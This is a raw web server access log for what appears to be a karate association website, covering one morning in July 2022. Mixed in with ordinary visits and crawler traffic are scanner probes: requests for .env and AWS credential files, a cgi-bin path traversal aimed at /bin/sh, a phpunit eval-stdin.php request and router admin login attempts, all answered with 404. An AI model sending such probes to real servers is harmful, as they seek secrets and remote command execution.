::ffff:45.61.186.139 - - [22/Jul/2022:04:32:32 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
::ffff:207.46.13.46 - - [22/Jul/2022:04:36:14 +0000] "GET /images/mlee.jpg HTTP/1.1" 404 154 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:24 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:24 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:24 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:24 +0000] "GET /images/JohnArce.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:24 +0000] "GET /images/tm.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:24 +0000] "GET /images/books/KarateDoZen.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:24 +0000] "GET /images/books/MBS2.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:24 +0000] "GET /images/books/MBS.gif HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:24 +0000] "GET /images/books/ZenMeditation.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:24 +0000] "GET /images/books/karatebook.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:24 +0000] "GET /images/books/bookoffiverings.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:24 +0000] "GET /images/books/shotokanSecrets.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:24 +0000] "GET /images/books/saibook.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:24 +0000] "GET /images/books/dummies.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:24 +0000] "GET /images/books/dojoWisdom.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:24 +0000] "GET /images/books/bobook.gif HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:25 +0000] "GET /images/books/guide20.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:25 +0000] "GET /images/books/movingzen.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:25 +0000] "GET /images/books/emptyHand.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:25 +0000] "GET /images/books/karatedo.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:25 +0000] "GET /images/books/karatedojo.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:25 +0000] "GET /images/books/grappingmethod.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:25 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:25 +0000] "GET /images/books/artofwar.jpg HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:41:28 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:24.4.186.45 - - [22/Jul/2022:04:44:36 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.net/resources" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62"
::ffff:135.125.246.189 - - [22/Jul/2022:04:58:53 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [22/Jul/2022:04:58:53 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.66.195 - - [22/Jul/2022:05:10:58 +0000] "GET /style.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:185.7.214.104 - - [22/Jul/2022:05:29:43 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 404 174 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:32:53 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 156 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:32:54 +0000] "GET /phpinfo.php HTTP/1.1" 404 150 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:32:54 +0000] "GET /phpinfo HTTP/1.1" 404 146 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:32:54 +0000] "GET /aws.yml HTTP/1.1" 404 146 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:32:55 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:32:55 +0000] "GET /.env.bak HTTP/1.1" 404 147 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:32:56 +0000] "GET /info.php HTTP/1.1" 404 147 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:32:56 +0000] "GET /laravel/.env HTTP/1.1" 404 151 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:32:56 +0000] "GET /local/.env HTTP/1.1" 404 149 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:32:57 +0000] "GET /cgi-bin/.env HTTP/1.1" 404 151 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:32:57 +0000] "GET /backend/.env HTTP/1.1" 404 151 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:32:58 +0000] "GET /application/config/sms_settings.php HTTP/1.1" 404 174 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:32:58 +0000] "GET /application/config/s3.php HTTP/1.1" 404 164 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:32:59 +0000] "GET /protected/.env HTTP/1.1" 404 153 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:32:59 +0000] "GET /database/.env HTTP/1.1" 404 152 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:33:00 +0000] "GET /public/.env HTTP/1.1" 404 150 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:33:01 +0000] "GET /app/config/.env HTTP/1.1" 404 154 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:33:01 +0000] "GET /.aws/credentials HTTP/1.1" 404 155 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:33:02 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:33:13 +0000] "GET /config/aws.yml HTTP/1.1" 404 153 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:33:14 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:13.84.161.159 - - [22/Jul/2022:05:33:15 +0000] "GET /config.js HTTP/1.1" 404 148 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
::ffff:163.123.143.71 - - [22/Jul/2022:05:34:07 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:185.7.214.104 - - [22/Jul/2022:05:34:49 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:185.254.196.115 - - [22/Jul/2022:06:00:49 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [22/Jul/2022:06:00:49 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [22/Jul/2022:06:22:21 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [22/Jul/2022:06:22:21 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.222.253.20 - - [22/Jul/2022:06:33:52 +0000] "GET /instructors.html HTTP/1.1" 404 155 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:114.119.141.249 - - [22/Jul/2022:06:34:38 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:134.122.135.64 - - [22/Jul/2022:07:10:37 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
::ffff:68.183.59.8 - - [22/Jul/2022:07:20:16 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
::ffff:157.55.39.33 - - [22/Jul/2022:07:25:50 +0000] "GET /style.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.254.196.115 - - [22/Jul/2022:07:30:42 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [22/Jul/2022:07:30:43 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:161.35.142.98 - - [22/Jul/2022:07:33:32 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:161.35.142.98 - - [22/Jul/2022:07:33:32 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:207.46.13.117 - - [22/Jul/2022:07:45:55 +0000] "GET /sfdojo/ HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:173.252.87.16 - - [22/Jul/2022:07:49:24 +0000] "HEAD / HTTP/1.1" 200 57618 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:139.162.220.181 - - [22/Jul/2022:07:50:51 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
::ffff:20.231.208.29 - - [22/Jul/2022:07:56:36 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:20.231.208.29 - - [22/Jul/2022:07:56:37 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:20.231.208.29 - - [22/Jul/2022:07:56:39 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 189 "-" "python-requests/2.25.1"
::ffff:114.119.145.194 - - [22/Jul/2022:08:07:17 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:66.249.66.199 - - [22/Jul/2022:08:09:23 +0000] "GET /dojoprocedures.html HTTP/1.1" 404 158 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:135.125.246.189 - - [22/Jul/2022:08:11:59 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [22/Jul/2022:08:11:59 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:212.192.242.22 - - [22/Jul/2022:08:13:16 +0000] "GET / HTTP/1.1" 200 57618 "-" "Linux Gnu (cow)"
::ffff:143.198.175.176 - - [22/Jul/2022:08:31:21 +0000] "GET /console/layui/layui.js HTTP/1.1" 404 161 "-" "Mozilla/5.0 (iPad; CPU OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0 Mobile/14B100 Safari/602.1"
::ffff:114.119.151.9 - - [22/Jul/2022:08:53:18 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "http://www.wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:17.121.115.226 - - [22/Jul/2022:09:01:09 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
::ffff:17.121.115.226 - - [22/Jul/2022:09:01:09 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
::ffff:185.254.196.115 - - [22/Jul/2022:09:03:25 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [22/Jul/2022:09:03:26 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:93.177.116.185 - - [22/Jul/2022:09:06:07 +0000] "GET / HTTP/1.1" 200 57618 "-" "-"
::ffff:93.177.116.185 - - [22/Jul/2022:09:06:08 +0000] "GET /events HTTP/1.1" 200 9974 "http://wadokikai.org/" "-"
::ffff:93.177.116.185 - - [22/Jul/2022:09:06:08 +0000] "GET /schools HTTP/1.1" 200 96626 "http://wadokikai.org/" "-"
::ffff:93.177.116.185 - - [22/Jul/2022:09:06:08 +0000] "GET /contact HTTP/1.1" 200 10017 "http://wadokikai.org/" "-"
::ffff:93.177.116.185 - - [22/Jul/2022:09:06:09 +0000] "GET /resources HTTP/1.1" 200 194907 "http://wadokikai.org/" "-"
::ffff:93.177.116.185 - - [22/Jul/2022:09:06:09 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "http://wadokikai.org/" "-"
::ffff:93.177.116.185 - - [22/Jul/2022:09:06:09 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "http://wadokikai.org/" "-"
::ffff:93.177.116.185 - - [22/Jul/2022:09:06:09 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "http://wadokikai.org/" "-"
::ffff:93.177.116.185 - - [22/Jul/2022:09:06:09 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "http://wadokikai.org/" "-"
::ffff:93.177.116.185 - - [22/Jul/2022:09:06:09 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "http://wadokikai.org/" "-"
::ffff:93.177.116.185 - - [22/Jul/2022:09:06:10 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "http://wadokikai.org/" "-"
::ffff:114.119.145.188 - - [22/Jul/2022:09:33:42 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "http://34.212.47.6/schools" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:104.206.128.66 - - [22/Jul/2022:09:45:44 +0000] "GET / HTTP/1.0" 200 57618 "-" "https://gdnplus.com:Gather Analyze Provide."
::ffff:135.125.246.189 - - [22/Jul/2022:09:54:02 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [22/Jul/2022:09:54:03 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.222.253.13 - - [22/Jul/2022:09:55:22 +0000] "GET /contact.html HTTP/1.1" 404 151 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:20.5.210.64 - - [22/Jul/2022:10:04:39 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "python-requests/2.28.1"
::ffff:114.119.145.193 - - [22/Jul/2022:10:05:31 +0000] "GET / HTTP/1.1" 200 57618 "http://34.212.47.6/contact?s=1&ss=2" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:43.153.208.98 - - [22/Jul/2022:10:27:22 +0000] "GET / HTTP/1.1" 200 57618 "-" "'Mozilla/5.0"
::ffff:185.254.196.115 - - [22/Jul/2022:10:32:17 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [22/Jul/2022:10:32:18 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:163.123.143.71 - - [22/Jul/2022:10:37:58 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
